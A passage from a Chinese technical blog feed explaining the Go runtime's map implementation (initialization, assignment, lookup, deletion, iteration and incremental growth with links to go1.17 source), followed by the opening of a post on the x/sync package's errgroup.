数组，有一部分还留在旧的数组中，所以在读写时就需要兼容这一点，具体的方式在下面的内容中会讨论到。</p><p>总结而言，golang 中的 map 用 hmap 来保存多个 bmap，而具体的键值对被保存在 bmap 中，每个 bmap 对应 hash 函数的一个结果，当某个 bmap 中的键值对满了但需要在这个 bmap 中新增键值对时，会通过“拉链法”在 bmap 之后链接一个新的 bmap 结构。而为了保证 map 的访问效率，还需要适时对 map 进行渐进式的扩容。</p><p>那么下面我们就来通过源码了解一下各个操作的具体逻辑。</p><h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>golang 中可以通过字面量或 make 方法来创建一个 map，但字面量的初始化方式会被转换为 make 与循环赋值的方式，所以最终的初始化还是由 make 来做的。另一方面，如果 map 可以分配在栈上且其容量小于 8 时，编译器会直接创建一个 hmap 的结构并为其赋初值。</p><p>当代码中使用 make 来创建 map 时，最终会调用 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=298-336" target="_blank" rel="noopener">runtime.makemap 函数</a> 或其变种，我们这里仅分析 makemap 函数。由于 map 的本质是一个 hmap 的指针，所以 makemap 函数的最终目的就是创建一个 hmap 结构并按需为其填充字段。其中 hmap.hash0 通过 fastrand 函数来初始化，这个值会作为后面 hash 函数的一部分来为其引入更多的随机性。紧随其后的是对 hmap.B 的初始化，通过循环调用 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1069-1072" target="_blank" rel="noopener">overLoadFactor 函数</a> 来找到一个最小能容纳 hint 个元素的 B 值，然后将其赋值给 hmap.B 字段。</p><p>根据 overLoadFactor 的定义可以得知，如果 hint 小于等于 bucketCnt（也就是 8），那么 B 就会取为 0，此时并不会创建 bmap 结构，而是等第一次赋值时才进行初始化。与之相对的，如果 hmap.B 不为 0，那么就会调用 <a href>makeBucketArray 函数</a> 来创建 bmap 数组，这个函数返回数组的首地址以及可能存在的溢出桶地址。</p><p>具体来看 makeBucketArray 函数中的逻辑，首先通过 <code>bucketShift(b)</code> 计算出 hmap.B 代表的 bmap 的数量，然后将这个值分别赋值给 base 和 nbuckets 变量，此时两个变量的值相等。然后判断 hmap.B 的值，如果大于等于 4，那么认为后面会使用溢出桶的概率比较高，此时会为 nbuckets 增加 <code>2^(hmap.B-4)</code> ，由于 nbuckets 才是最终创建的 bmap 数组的长度，所以此时创建的 bmap 的数量是大于所需数量的，多出来的这部分就作为未来会使用的溢出桶。</p><p>也就是说，最终创建的 bmap 数组中会有 nbuckets 个元素，其中前 2^B 个元素是正常的 bmap，而后 <code>nbuckets - 2^B</code> 个元素是作为溢出桶的 bmap。为了方便访问溢出桶，就需要记录一下溢出桶的位置，这也就是 makeBucketArray 函数的第二个返回值。如果 bmap 数组中存在溢出桶，那么 nbuckets 和 base 变量就不再相等，其中 base 的值就是正常 bmap 的数量，也就是 2^B。所以在 makeBucketArray 的 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=376-385" target="_blank" rel="noopener">最后</a> 判断了两个变量是否相等，如果不相等，那么算出第一个溢出桶的地址，将这个地址赋值给 hmap.extra 并返回给调用者。同时，会通过 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=211-213" target="_blank" rel="noopener">bmap.setoverflow 函数</a> 将 bmap 中最后一个溢出桶的 ptr 指向第一个 bmap，而由于创建 bmap 数组时是申请了对应大小的内存并填充 0 在里面，所以整个 bmap 数组中除最后一个溢出桶外的所有 bmap.ptr 都是 nil，这就把最后一个溢出桶与其他的 bmap 结构区分开了，这个区分的作用留到后面的小节来讨论。</p><p>此外，我们前面提到，bmap.tophash 中有一些值被用作了保留项，可以看到 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=92" target="_blank" rel="noopener">0 对应的含义</a> 是“这个槽是空的且后面没有更多的数据了”，而由于 bmap 内部在初始化时所有的字节都是 0，所以就在初始化时直接达成了这个保留项的目的。</p><h1 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h1><p>golang 中对 map 进行写入时的代码类似于 <code>map[key] = val</code>，这个语句在编译时会被替换成对 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=570-683" target="_blank" rel="noopener">runtime.mapassign 函数</a> 的调用，这个函数接收 key 的指针并返回 val 的地址，拿到地址后通过编译器加入的赋值语句完成对 map 中字段的赋值。</p><p>首先，golang 中的 map 是不支持并发读写的，这一点在代码里也做了一定的保证，具体来说，<a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=99-103" target="_blank" rel="noopener">hmap.flags 字段中的各个位记录了 map 的各种状态</a>，其中右边数第三位被称为 hashWriting，在写入和删除操作中会通过异或的方式 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=589-591" target="_blank" rel="noopener">设置这个标记位</a>，并在结束后 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=675-678" target="_blank" rel="noopener">取消这个标记位</a>。如果在写入和读取时发现这个标记位已经被设置，那么就会直接 panic。为了复现这一点也很简单，只要创建两个 goroutine 对同一个 map 做读写即可。</p><p>然后，mapassign 函数会通过 hasher 函数计算入参的 key 对应的哈希值，如前所述，这个值是 uintptr 类型。</p><p>紧接着是判断 hmap.buckets 字段是否为 nil，在前面讨论 makemap 的逻辑中曾提到，如果创建时传递的大小不超过 bucketCnt，那么 hmap.B 的值为 0，此时并不会创建 hmap.buckets 结构，直到第一次对其赋值，也就是调用 mapassign 时才会做延迟创建，从 mapassign 的代码中也印证了这一点。</p><p>如果不考虑扩容的逻辑，那么 mapassign 的核心逻辑其实和前面讨论基本原理时提到的一样，会用 hash 函数结果的低位作为 bmap 的下标，高八位作为 tophash 来查找 bmap，如果一个 bmap 中找不到且有溢出桶，那么到溢出桶里继续寻找，如果找不到，那么就是新增的 key，此时要在 bmap 中新增一个键值对并增加 hmap.count 结构，如果能找到，那么就是要修改的 key，此时返回对应的 value 的地址，然后由编译器插入的语句来完成值的更新。这样看来，键值对在 bmap 中是顺序写入的，所以如果在读取时遇到了 emptyRest，也就是 0 这个特殊值，那么就可以认为这个 bmap 之后不会有数据了，此时就可以直接停止遍历。</p><p>遍历溢出桶的方式很简单，其实和遍历链表的逻辑相同，只要一直找到 hmap.ptr 为 nil 即可。但新增溢出桶则麻烦一些，如果当前 bmap 链表已经满了，但是需要在这个链表中增加新的键值对时，就需要分配一个新的溢出桶并放在链表的尾部，在代码中这是通过 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=245-271" target="_blank" rel="noopener">hmap.newoverflow 函数</a> 来 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=652-658" target="_blank" rel="noopener">实现</a> 的。</p><p>这个函数会判断 hmap.extra 是否为 nil，前面分析 map 初始化时我们曾讨论过，如果提前分配了溢出桶，那么这个字段就不会为 nil，此时判断 hmap.extra.nextOverflow 字段，这个值会作为指针指向下一个可用的溢出桶，如果这个值不为 nil，那么其指向的 bmap 就可以直接返回给调用者，否则说明没有更多的溢出桶，需要新申请一块内存并返回。</p><p>当有可用的溢出桶时，还要进一步判断 <code>hmap.extra.nextOverflow.overflow()</code> 是否为 nil，前面讨论 map 初始化时我们提到过，最后一个溢出桶的这个值不是 nil，所以如果这个 overflow 函数返回了非 nil，那么就说明当前调用返回的 bmap 就是最后一个溢出桶了。</p><p>几经曲折拿到一个可用的 bmap 结构后，需要调用 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=219-243" target="_blank" rel="noopener">hmap.incrnoverflow 函数</a> 来增加 hmap.noverflow，从代码中可以发现这个增加并非是准确的，当 hmap.B &gt;= 16 时会采样自增，但是这没有什么问题，因为这个值其实只用来判断是否需要扩容，而采样自增还是全量自增对这个判断的影响不大。</p><p>在 newoverflow 函数的最后，这个新获得的 bmap 会被链接在入参的 bmap 之后，这个入参是当前 bmap 链表的最后一个元素，经过这个链接后，新获取的 bmap 会取而代之成为最后一个元素。</p><h1 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h1><p>golang 中对 map 的读取有两种方式，分别是 <code>val := map[key]</code> 和 <code>val, ok := map[key]</code>，其中后者除了返回 val 或零值外还会返回一个 bool 值用于标识 map 内部是否存在这个 key。这两种访问方式会被编译器分别转换为对 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=389-450" target="_blank" rel="noopener">runtime.mapaccess1 函数</a> 与 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=452-508" target="_blank" rel="noopener">runtime.mapaccess2 函数</a> 的调用，粗略扫一下这两个函数的代码可以发现，它们的结构其实是相同的，不同点在于后者会返回 bool 值表示 key 是否存在，不清楚为什么 mapaccess1 没有通过直接调用 mapaccess2 来实现。</p><p>这里仅分析 mapaccess2 的代码，首先判断 hmap.count 是否为 0，如果为 0，那么不需要计算 hash 也不需要遍历 bmap 就可以知道内部一定不存在 key。而如果 hmap.count 不为 0，则继续判断 hmap.flags 的 hashWriting 标记位是否被设置过，正如前面讨论写入时曾提到过，如果这个标记位被设置，那么当前 map 正在被某个 goroutine 进行写操作。回过来，如果 hashWriting 被设置了，那么直接 panic 退出。</p><p>后面的逻辑与写入时的 mapassign 差不多，先根据 hash 函数结果的低位判断 bmap 的下标，然后用高八位做 tophash，遍历该下标下的 bmap 链表，遍历的过程中先比较 tophash，如果相等则进一步判断 key 是否相等，当 key 也相等时就取出对应 value 的地址并返回。此外，前面讨论 map 的写入时我们曾提到，键值对在 bmap 中是顺序写入的，所以如果在读取中 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=489-491" target="_blank" rel="noopener">遇到了 emptyRest</a>，那么就可以直接停止遍历，直接返回没有这个键值对。</p><h1 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h1><p>golang 中从 map 中删除某个 key 的方式是 <code>delete(map, key)</code>，这个函数不会返回任何内容，如果被删除的 key 不在对应的 map 里也不会有什么问题。在实现上，delete 函数会被编译器转换为对 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=685-796" target="_blank" rel="noopener">runtime.mapdelete 函数</a> 的调用，从函数的签名上也可以看到，该函数不会返回任何内容，这与 delete 的行为一致。</p><p>mapdelete 首先会判断 hmap.count 字段，如果其为 0，那么直接退出流程，因为此时不会有任何 key 会被删除。然后，mapdelete 会判断 hmap.flags 的 hashWriting 标记位，因为删除也是一种写操作。再之后的流程就和写入与读取相同，遍历 hmap.buckets 中的 bmap 结构尝试找到待删除的键值对，如果找到则将对应的 key 和 value 的内存清零，然后将对应的 tophash 设置为 emptyOne，这个标记与 emptyRest 不同，它仅仅表示当前的 tophash 以及对应的键值对是可以写入的，而 emptyRest 同时还表示这个 tophash 及之后都没有键值对了。</p><p>如果一个键值对被删除，那么它的 tophash 会被设置为 emptyOne，但如果被删除的是最后一个键值对，即在这个键值对之后没有其他的数据了，那么就需要将它的 tophash 设置为 emptyRest，这个值的含义在上面已经讨论过了。而一旦有 tophash 被设置为 emptyRest，就需要进一步判断相邻的前一个 tophash 是否是 emptyOne，如果有则将前面的相邻的所有 emptyOne 都设置为 emptyRest。mapdelete 中用一个 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=763-780" target="_blank" rel="noopener">for 循环</a> 来做这件事，它不断地向前处理 emptyOne，当前 bmap 处理结束后就去处理链表中的前一个 bmap，直到没有 emptyOne。这样才能维持 emptyRest 的语义，保证读写时的效率。</p><p>处理完 tophash 后，就需要将 hmap.count 减小一位，然后在 map 中没有元素，即 hmap.count 为 0 时重置 hmap.hash0，使下一次的同一个 key 算出来的 hash 和上次不同，进一步提高了 map 的随机性。最后，mapdelete 再次判断 hmap.flags 的 hashWriting，如果没有并发读写问题，就将其清零。</p><p>通读 mapdelete 后我们可以发现，它并没有 bmap 的清理逻辑，即便一个溢出桶中所有的 tophash 都是 emptyRest，这个 bmap 也不会被清理掉。虽然这使得 bmap 链表的长度没有随着删除而减少，但这其实并不怎么影响读写的效率，因为 emptyRest 可以让 bmap 链表的遍历提前终止，而 mapdelete 维护了 emptyRest 的语义。另一方面，不清理 bmap 使得后续再写入溢出桶时不需要再分配新的内存，这进一步提高了写操作的效率。但过长的 bmap 链表是内存不友好的，所以 map 引入了新的机制来保证溢出桶的数量不会太多，这个机制就是扩容操作，我们在后面的小节会进行讨论。</p><h1 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h1><p>这里的遍历指的就是 for-range 操作，具体来说，是 <code>for key, val := range map</code>、 <code>for key := range map</code>以及 <code>for range map</code>。这些操作会被编译器展开为类似如下的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hit := hiter&#123;&#125;</span><br><span class="line">mapiterinit(maptype, hmap, &amp;hit)</span><br><span class="line"><span class="keyword">for</span> ; hit.key != <span class="literal">nil</span>; mapiternext(&amp;hit) &#123;</span><br><span class="line">    key := *hit.key</span><br><span class="line">    val := *hit.val</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中 for 循环内部的 key 和 val 是与 for-range 等式左边的变量一一对应的，所以如果只有 key 的话那么 for 循环内部也只有 key，没有变量时情况与此类似。</p><p>继续分析上面生成的代码，核心在于 hiter 类型以及 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=798-849" target="_blank" rel="noopener">mapiterinit 函数</a> 与 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=851-975" target="_blank" rel="noopener">mapiternext 函数</a>，先看一下 hiter 类型的定义，这里给出各个字段的注释，在两个功能函数中会用到它们：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> hiter <span class="keyword">struct</span> &#123;</span><br><span class="line">key         unsafe.Pointer <span class="comment">// 本次循环中获取到的 key，如果为 nil 那么结束遍历</span></span><br><span class="line">elem        unsafe.Pointer <span class="comment">// 本次循环中获取到的 val，如果为 nil 那么结束遍历</span></span><br><span class="line">t           *maptype <span class="comment">// 内部有当前 map 的类型信息，由于 mapiternext 没有像 mapiterinit 一样接收这个参数，所以需要将它保存到 hiter 中直接被 mapiternext 使用</span></span><br><span class="line">h           *hmap <span class="comment">// 被遍历的 map，保存在这里的作用同 t 字段</span></span><br><span class="line">buckets     unsafe.Pointer <span class="comment">// 调用 mapiterinit 时的 hmap.buckets</span></span><br><span class="line">bptr        *bmap          <span class="comment">// 调用 mapiternext 时需要被遍历的 bmap，包括溢出桶</span></span><br><span class="line">overflow    *[]*bmap       <span class="comment">// 调用 mapiterinit 时的 hmap.extra.overflow</span></span><br><span class="line">oldoverflow *[]*bmap       <span class="comment">// 调用 mapiterinit 时的 hmap.extra.oldoverflow</span></span><br><span class="line">startBucket <span class="keyword">uintptr</span>        <span class="comment">// 被选为第一个遍历的 bmap，是一个下标</span></span><br><span class="line">offset      <span class="keyword">uint8</span>          <span class="comment">// 遍历 bmap 时从第几个键值对开始</span></span><br><span class="line">wrapped     <span class="keyword">bool</span>           <span class="comment">// 是否已经遍历了一圈，当遍历的 bmap 回到 startBucket 时，如果 wrapped 为 true 那么结束遍历</span></span><br><span class="line">B           <span class="keyword">uint8</span> <span class="comment">// 调用 mapiterinit 时的 hmap.B</span></span><br><span class="line">i           <span class="keyword">uint8</span> <span class="comment">// 调用 mapiternext 时需要被遍历的 bmap 中键值对的下标，会与 offset 字段配合</span></span><br><span class="line">bucket      <span class="keyword">uintptr</span> <span class="comment">// 调用 mapiternext 时需要被遍历的下一个 bmap 链表的下标</span></span><br><span class="line">checkBucket <span class="keyword">uintptr</span> <span class="comment">// 与扩容有关</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后继续看上面的 for 循环，为了保证第一次循环时 hit 中已经有 key 和 val 了，可以猜测 mapiterinit 内部或者直接对 key 和 val 进行了赋值，或者调用了 mapiterinit，从代码中可以看到是 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=848" target="_blank" rel="noopener">后者</a>。下面就一一分析一下这两个函数。</p><p>首先来看 mapiterinit，在函数的开始判断了 hmap.count 是否为 0，如果为 0 那么直接 return，此时 hiter 的 key 和 elem 字段都是 nil，回到上面被编译器生成的代码中，可以发现如果 key 为 nil，那么整个 for-range 就会结束。</p><p>然后，mapiterinit 会根据入参来填充 hiter 中的各个字段，其中 startBucket 和 offset 是随机选择的，这两个字段用于指引 mapiternext 从哪里开始遍历键值对，正是因为在这里引入了随机性，所以每次遍历同一个 map 得到的键值对顺序都可能是不同的。反过来说，如果把 startBucket 和 offset 都设置成 0，然后构建一个长度为 8 的 map，那么每次遍历拿到的键值对序列都会相同。</p><p>在 mapiterinit 的最后会给 hmap.flags 设置 iterator 和 oldIterator 两个标记位，然后进一步调用 mapiternext，尝试填充 key 和 elem 两个字段，第一次调用 mapiternext 时，一定会拿到一对不为 nil 的键值对。</p><p>map 的 for-range 也被认为是一种读操作，所以 mapiternext 的一开始就判断了 hmap.flags 的 hashWriting 标记位，如果这个标记位被设置过，那么表示存在并发读写，此时会直接 panic。然后 mapiternext 就开始遍历这个 map，每次找到一个键值对后就将上下文保存在 hiter 中方便下一次 mapiternext 被调用时来使用这些信息，然后将这次找到的键值对赋值到 hiter 上，这样编译器生成的代码就可以直接从 hiter.key 和 hiter.elem 中获取所需的内容。</p><p>在遍历的过程中，hiter.bptr 记录了正在遍历的 bmap，这个 bmap 从第 hiter.offset 个键值对开始，检查所有的键值对后判断是否有溢出桶，如果有的话将 hiter.bptr 指向溢出桶，那么下次调用 mapiternext 时就会从新的 bmap 中遍历返回键值对，新的 bmap 也是从第 hiter.offset 个键值对开始的。在 mapiternext 中不能通过检查 tophash 是否为 emptyRest 来决定是否直接结束遍历，因为 hiter.offset 很可能使最开始遍历的 tophash 不是第一个，所以即便遇到了 emptyRest，也要至少把当前这个 bmap 遍历完才可以。</p><p>而 hiter.wrapped 则记录了 bmap 数组中的最后一个 bmap 是否被遍历过，所以如果当前需要遍历的 bmap 数组的下标是 hiter.startBucket，并且 hiter.wrapped 为 true 的话，那么就可以判断所有的键值对都被遍历过，此时直接将 hiter.key 和 hiter.elem 赋值为 nil，这样编译器生成的代码就会命中 for 循环的结束条件，从而结束整个循环过程。</p><p>虽然 for-range 的过程结束了，但不论是 mapiterinit 还是 mapiternext 都没有清理 hmap.flags 中的 iterator 和 oldIterator 标记位，事实上，这两个标记的清理是在扩容阶段做的。</p><h1 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h1><p>扩容的目的有两个，第一是在保存的键值对数量大于一定量时，哈希冲突的问题会变得频繁，此时需要增加 bmap 的数量来扩大哈希函数的取值范围；第二是当溢出桶太多时，需要重新设置键值对在 bmap 中的布局，让它们排列得更紧凑，这样一方面减少溢出桶的数量从二降低内存压力，一方面能加速遍历 bmap 链表，因为 emptyOne 在重排列后会消失。这两个扩容策略分别对应代码中的 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1069-1072" target="_blank" rel="noopener">overLoadFactor 函数</a> 和 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1074-1087" target="_blank" rel="noopener">tooManyOverflowBuckets 函数</a>。</p><p>正如前面在基本原理中讨论的，map 的扩容是渐进式的，会被分摊到各次的写操作中，且因为引入了“扩容中”的状态，所以读操作也要对它做一些兼容。</p><p>扩容操作的触发点在 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=645-650" target="_blank" rel="noopener">mapassign 函数中</a>，如前所述，就是对 map 进行赋值时，更具体来说是向 map 中增加新的键值对时。<a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1089-1092" target="_blank" rel="noopener">hmap.growing 函数</a> 是一个谓词函数，通过判断 hmap.oldbuckets 是否为 nil 来获知当前的 map 是否在扩容中，如果没有在扩容，且新增一个 key 后不满足负载因子的条件或有太多的溢出桶，那么就会调用 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1026-1067" target="_blank" rel="noopener">hashGrow 函数</a> 进行扩容，扩容后会用 <code>goto again</code> 重新执行 mapassign 的逻辑。下面我们就一起来看下 hashGrow 这个函数的代码，然后再看看执行过这个函数后 mapassign 的流程会有什么不同。</p><p>hashGrow 首先区分了扩容的触发原因，如果是因为有太多的溢出桶，那么会分配与原来长度相同的新的 bmap 数组，并设置 hmap.flags 的 sameSizeGrow 标记位，否则会创建原来两倍大小的 bmap 数组。然后判断 hmap.flags 是否设置过 iterator 标记位，这个标记是在 for-range 的 mapiterinit 函数中设置的，如果设置过，那么清除 iterator，只保留 oldIterator。在这之后，将新的状态更新到 hmap 中，包括新的 B、新的 flags ，更重要的，旧的 bmap 数组会被赋值给 hmap.oldbuckets 中，而 hmap.buckets 会保存新申请的 bmap 数组，虽然此时所有的键值对都在旧数组中。</p><p>hashGrow 函数执行后，hmap 结构上就有了两个 bmap 数组，在数据迁移完成之前，此时的 map 是处于“扩容中”的状态的，这使得对该 map 的读写都要有一些兼容的地方。首先来看 mapassign 函数，hashGrow 被调用后会重新执行 mapassign 的逻辑，因为 mapassign 只有新增键值对时才会触发扩容，而 hashGrow 调用后新的 bmap 数组中没有任何数据，此时如果向其中写入新的键值对，那么会对迁移操作造成影响。</p><p>那么 mapassign 在当前 map 处于“扩容中”时会做什么呢？答案是 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=599-601" target="_blank" rel="noopener">调用growWork 函数</a>。在调用时传递了当前的 hmap 结构以及 mapassign 要写入的 bmap 的下标，这个函数的逻辑非常简单，首先用入参的下标计算对应的扩容前的下标，然后用这个计算的下标调用了一次 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1137-1249" target="_blank" rel="noopener">evacuate 函数</a>，然后如果当前 map 仍在扩容中，那么用 hmap.nevacuate 再调用一次 evacuate。之所以要再判断一下是否在扩容，是因为很可能第一次的 evacuate 就完成了整个 map 的扩容。</p><p>evacuate 的代码虽然比较长，但是核心逻辑也很简单，如果传递的下标对应的 bmap 链表还没有迁移，那么执行迁移，否则跳过这部分逻辑。每次调用 evacuate 时如果要迁移，那么会将入参下标对应的整个 bmap 链表迁移完，执行迁移时会区分当前是否为 sameSizeGrow，如果是的话那么直接将旧链表中所有有效的数据迁移到新链表中，然后将旧链表中的 tophash 设置为 evacuatedEmpty 或 evacuatedX；如果不是 sameSizeGrow，那么说明新的 bmap 数组的长度是旧数组的两倍，此时在迁移键值对时会计算 <code>hash(key) &amp; 2^hmap.B</code> 的值，由于 hmap.B 已经增加了一，那么这个与运算得到的结果会比原来的结果多一个最高位，如果这一位为 1，那么将这个键值对到 <code>下标 + 2^(hmap.B-1)</code> 的 bmap 链表并设置 tophash 为 evacuatedY，否则迁移到下标对应的 bmap 链表并设置 tophash 为 evacuatedX。</p><p>在 evacuate 的最后，会判断入参的下标是否与 hmap.nevacuate 相等，如果相等那么调用 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1251-1273" target="_blank" rel="noopener">advanceEvacuationMark 函数</a>，这个函数的主要作用在于调整 hmap.nevacuate 的状态以及判断扩容是否完成。对于 hmap.nevacuate 的更新，由于 hashGrow 内部调用了两次 evacuate，第一次传递的下标是随机的，所以 hmap.nevacuate 之后可能有很多 bmap 链表已经完成迁移了，advanceEvacuationMark 每次最多会检查 1024 个链表，也就是说 hmap.nevacuate 每次最多增加 1024，实际迁移的链表数量是可能大于这个值的。而一旦 hmap.nevacuate 的值与旧 map 的长度相等，那么说明这个 map 的所有键值对都完成迁移，此时将 hmap.oldbuckets 设置为 nil，让 hmap.growing 返回 false。</p><p>以上就是 map 扩容的逻辑，现在回过头来看下读写操作对扩容的兼容。首先是 mapassign，如前所述，当决定了要写入的 bmap 链表的下标时，如果当前 map 在扩容，那么会用这个下标调用 growWork 来完成对应的旧链表的迁移。growWork 结束后，新的链表中就有了迁移后的紧凑的数据，自此 map 的扩容不会再对这个链表造成影响，所以对这个链表正常执行 mapassign 的逻辑即可。</p><p>与 mapassign 类似，mapdelete 作为另一种写操作，也会按需调用 growWork 来完成待删除键值对所在 bmap 链表的迁移，调用后也只需要正常对新链表执行 mapdelete 的逻辑，因为此后 map 的扩容不会再对这个链表造成影响。</p><p>和写操作不同，读操作并不会按需执行 growWork，所以它们对扩容的支持相对麻烦一些，首先来看 mapaccess2（mapaccess1 的逻辑与此相同，这里不在赘述），这个函数读取了 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=474-483" target="_blank" rel="noopener">hmap.oldbuckets 是否为 nil</a>，如果不为 nil，那么就说明当前 map 处于扩容中（与 hmap.gorwing 是一个道理），此时从 oldbuckets 中获取 hash 对应的旧的 bmap 结构，然后判断这个 bmap 是否完成迁移，如果没有完成，那么就把这个 bmap 赋值给 b 变量，此后的读逻辑就会到这个 bmap 对应的链表中查找所需的 key。</p><p>另一个读操作是 map 的遍历，具体的逻辑在 mapiternext 函数中。由于“在遍历 map 的过程中向其写入新的键值对”这个行为是不确定的，而 hmap 的扩容只会发生在 mapassign 新增键值对时，所以如果要考虑 for-range 与扩容的关系，那么正常情况下只会有 map 处于扩容中的时候对其进行 for-range，而不会有 for-range 的过程中开始扩容。对于这种情况，mapiternext 的处理与 mapaccess2 类似，如果当前遍历的 bmap 链表没有完成迁移，那么去遍历迁移前的 bmap 链表，如果已经完成迁移，那么直接遍历新的 bmap 链表。</p><p>但由于 for-range 最终会遍历整个 map，所以如果在非 sameSizeGrow 的情况下单纯用这种方式是会有问题的，因为比如扩容前有 2 个 bmap 链表，扩容后有 4 个，那么 0 和 3 都对应原来的 0 号链表，而遍历后会分别扫过 0 和 3，如果判断原来的 0 没有做迁移，那么就会遍历两次 0 号链表，最终的结果就是部分键值对会出现两次。所以，mapiternext 在遍历时以新的 bmap 数组为准，假设当前遍历的新 bmap 链表为 a，那么如果对应的旧 bmap 链表还没有迁移，就会去遍历旧链表，然后 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=911-924" target="_blank" rel="noopener">只返回那些迁移时会被移动到 a 中的键值对</a>，下次遍历这个旧链表时再返回剩余的部分。</p><p>另外，和新增键值对不同，修改已有的键或删除某个键是被允许的，而这虽然不会引起扩容，但是会导致迁移。也就是说，有可能两次连续调用 mapiternext 来从同一个 bmap 结构中获取两个键值对，然后在调用之间修改了 map 中的键对应的值，或是直接删除了某个键，那么很可能在第一次调用时这个 bmap 还是未迁移的状态，而第二次调用时却是已经迁移的状态了。要解决这个这个问题也很简单，因为一旦某个 bmap 被迁移，那么它的 tophash 会是 evacuatedX 或 evacuatedY，此时只需要在遍历到这种键值对时 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=949-963" target="_blank" rel="noopener">特殊处理</a> 即可。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>golang x/sync 包源码解读</title>
      <link href="/2022/12/12/golang-sync-package/"/>
      <url>/2022/12/12/golang-sync-package/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>golang 的 sync 和 sync/atomic 标准库中提供了很多并发编程相关的基础工具，基于这些基础工具可以向上封装一些更适用于应用场景的工具。比如 <a href="https://github.com/golang/sync" target="_blank" rel="noopener">x/sync</a> 包就提供了 errgroup、singleflight、syncmap 和 semaphore，其中 syncmap 在 go1.9 版本中已经进入了 sync 标准库中，被广泛应用在各种应用中。除此之外，我在工作中也使用过其中的 errgroup 和 singleflight。</p><p>为了更好地理解其中的原理，下面对这四种工具的源码进行解读，这篇博客假设读者已经掌握了这些工具的使用方法，如果有需要，读者可以通过点击上面的链接来查看各个工具的测试代码。</p><h1 id="errgroup"><a href="#errgroup" class="headerlink" title="errgroup"></a>errgroup</h1><blockquote><p>源码：<a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go" target="_blank" rel="noopener">https://github.com/golang/sync/blob/master/errgroup/errgroup.go</a></p></blockquote><p>errgroup 整体而言比较简单，可以看作是 sync.WaitGroup 的升级版，所以能使用 sync.WaitGroup 的场景基本都可以用 errgroup 来代替。为了方便表述，后文将 sync.WaitGroup 均称为 wg，这也是我通常使用的该类型变量的变量名。</p><p>wg 适用于一个 goroutine 等待多个 goroutine 执行的场景，举例来说，我们作为服务端可能要给前端返回用户的详细个人信息，这些信息需要调用不同的 rpc 从不同的服务中获取，最终由请求的 handler 整合后返回。那么就可以提前生成一个响应结构，然后通过 wg 来启动多个 goroutine，每个 goroutine 负责请求不同的 rpc 并将结果填充进响应结构中，对于生成响应的 goroutine 而言只需要 